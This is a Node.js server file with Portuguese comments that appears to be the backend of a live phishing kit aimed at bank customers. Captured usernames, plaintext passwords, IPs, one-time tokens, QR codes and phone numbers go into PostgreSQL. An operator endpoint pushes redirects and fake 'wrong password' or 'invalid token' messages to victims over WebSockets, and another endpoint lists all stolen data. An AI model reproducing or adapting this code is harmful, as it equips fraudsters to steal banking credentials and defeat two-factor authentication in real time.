const WebSocket = require('ws');
const express = require('express');
const cors = require('cors');
const path = require('path');
const { Pool } = require('pg');

// ===============================
// Use a porta fornecida pelo ambiente ou 5000 como padrão
const HTTP_PORT = process.env.PORT || 5000;
// A porta do WebSocket será gerenciada internamente pelo Express

// ===============================
// Configuração do Banco de Dados PostgreSQL
// A URL de conexão será fornecida pela variável de ambiente DATABASE_URL
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// ===============================
// CRIA TABELAS (se não existirem)
// ===============================
async function setupDatabase() {
    const client = await pool.connect();
    try {
        await client.query(`
            CREATE TABLE IF NOT EXISTS logins (
                id SERIAL PRIMARY KEY,
                usuario TEXT,
                senha TEXT,
                ip TEXT,
                criado_em TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS dados_usuario (
                usuario TEXT PRIMARY KEY,
                nome TEXT,
                dispositivo TEXT,
                feixe TEXT,
                qr TEXT,
                senha TEXT,
                token TEXT,
                telefone TEXT,
                atualizado_em TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('Tabelas do banco de dados verificadas/criadas com sucesso.');
    } finally {
        client.release();
    }
}

setupDatabase().catch(console.error);

// ===============================
const clientes = new Map();

// ===============================
const app = express();
app.use(cors());
app.use(express.json());

// ===============================
app.use((req, res, next) => {
    console.log(`[HTTP] ${req.method} ${req.url}`);
    next();
});

// ===============================
app.use(express.static(path.join(__dirname, 'public')));

app.post('/dados', async (req, res) => {
    const { usuario, nome, dispositivo, feixe, qr, telefone } = req.body;
    if (!usuario) return res.json({ ok: false });

    try {
        await pool.query(`
            INSERT INTO dados_usuario (usuario, nome, dispositivo, feixe, qr, telefone, atualizado_em)
            VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
            ON CONFLICT(usuario) DO UPDATE SET
                nome=COALESCE(excluded.nome, dados_usuario.nome),
                dispositivo=COALESCE(excluded.dispositivo, dados_usuario.dispositivo),
                feixe=COALESCE(excluded.feixe, dados_usuario.feixe),
                qr=COALESCE(excluded.qr, dados_usuario.qr),
                telefone=COALESCE(excluded.telefone, dados_usuario.telefone),
                atualizado_em=CURRENT_TIMESTAMP
        `, [usuario, nome, dispositivo, feixe, qr, telefone]);
        console.log('✅ Dados atualizados:', usuario);
        res.json({ ok: true });
    } catch (err) {
        console.error('Erro ao inserir/atualizar dados:', err);
        res.status(500).json({ ok: false });
    }
});

app.get('/usuarios', (req, res) => {
    res.json([...clientes.keys()]);
});

app.get('/dados_usuario', async (req, res) => {
    try {
        const { rows } = await pool.query('SELECT * FROM dados_usuario');
        res.json(rows);
    } catch (err) {
        console.error('Erro ao buscar dados de usuários:', err);
        res.json([]);
    }
});

app.post('/enviar', async (req, res) => {
    const { usuario, tipo } = req.body;
    const ws = clientes.get(usuario);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.json({ ok: false, error: 'Cliente não conectado' });
    }

    try {
        const { rows } = await pool.query('SELECT * FROM dados_usuario WHERE usuario=$1', [usuario]);
        const row = rows[0];
        if (!row) return res.json({ ok: false, error: 'Usuário não encontrado' });

        const tiposRedirecionamento = ['TOKEN', 'QR', 'FEIXE', 'SMS'];
        let payload = { acao: '', nome: row.nome, usuario: usuario };

        if (tiposRedirecionamento.includes(tipo)) {
            payload.acao = 'redirecionar';
            if (tipo === 'TOKEN') payload.url = '/token.html';
            if (tipo === 'QR') payload.url = '/qr.html';
            if (tipo === 'FEIXE') payload.url = '/feixe.html';
            if (tipo === 'SMS') payload.url = '/sms.html';
            payload.feixe = row.feixe;
            payload.qr = row.qr;
            payload.dispositivo = row.dispositivo;
            payload.telefone = row.telefone;
            console.log(`📤 Enviado redirecionamento ${tipo} para ${usuario}`);
        } else if (tipo === 'SENHA_INCORRETA') {
            payload.acao = 'senha_incorreta';
            payload.mensagem = 'Senha incorreta. Tente novamente.';
            console.log(`🔐 Enviado senha_incorreta para ${usuario}`);
        } else if (tipo === 'TOKEN_INCORRETO') {
            payload.acao = 'erro_token';
            payload.mensagem = 'Token inválido ou expirado. Solicite um novo.';
            console.log(`🎫 Enviado token_incorreto para ${usuario}`);
        } else if (tipo === 'CHAVE_INCORRETA') {
            payload.acao = 'erro_chave';
            payload.mensagem = 'Chave inválida ou expirada. Solicite uma nova.';
            console.log(`🔑 Enviado chave_incorreta para ${usuario}`);
        } else {
            return res.json({ ok: false, erro: 'tipo inválido' });
        }

        ws.send(JSON.stringify(payload));
        res.json({ ok: true });

    } catch (err) {
        console.error('Erro no endpoint /enviar:', err);
        res.status(500).json({ ok: false });
    }
});

// Inicia o servidor HTTP
const server = app.listen(HTTP_PORT, () => {
    console.log('HTTP rodando em http://localhost:' + HTTP_PORT );
});

// Inicia o servidor WebSocket no mesmo servidor HTTP
const wss = new WebSocket.Server({ server });

console.log('WS rodando na mesma porta do HTTP.');

wss.on('connection', (ws, req) => {
    const ip = req.socket.remoteAddress;
    console.log('Nova conexão WS:', ip);

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            const { usuario } = data;

            if (data.acao === 'login') {
                const { senha } = data;
                await pool.query('INSERT INTO logins (usuario, senha, ip) VALUES ($1, $2, $3)', [usuario, senha, ip]);
                await pool.query(`
                    INSERT INTO dados_usuario (usuario, senha, atualizado_em) VALUES ($1, $2, CURRENT_TIMESTAMP)
                    ON CONFLICT(usuario) DO UPDATE SET senha=excluded.senha, atualizado_em=CURRENT_TIMESTAMP
                `, [usuario, senha]);
                
                if (clientes.has(usuario)) {
                    try { clientes.get(usuario).close(); } catch {}
                }
                ws.usuario = usuario;
                clientes.set(usuario, ws);
                console.log('✅ Login:', usuario);

            } else if (data.acao === 'reconectar') {
                if (!usuario) return;
                if (clientes.has(usuario)) {
                    try { clientes.get(usuario).close(); } catch {}
                }
                ws.usuario = usuario;
                clientes.set(usuario, ws);
                console.log('🔄 Reconectado:', usuario);

            } else if (data.acao === 'token') {
                const { token } = data;
                if (!usuario || !token) return;
                await pool.query(`
                    INSERT INTO dados_usuario (usuario, token, atualizado_em) VALUES ($1, $2, CURRENT_TIMESTAMP)
                    ON CONFLICT(usuario) DO UPDATE SET token=excluded.token, atualizado_em=CURRENT_TIMESTAMP
                `, [usuario, token]);
                console.log('🔑 Token:', usuario, token);
            }
        } catch (err) {
            console.error('Erro WS message:', err);
        }
    });

    ws.on('close', () => {
        if (ws.usuario && clientes.get(ws.usuario) === ws) {
            clientes.delete(ws.usuario);
            console.log('❌ Desconectado:', ws.usuario);
        }
    });
});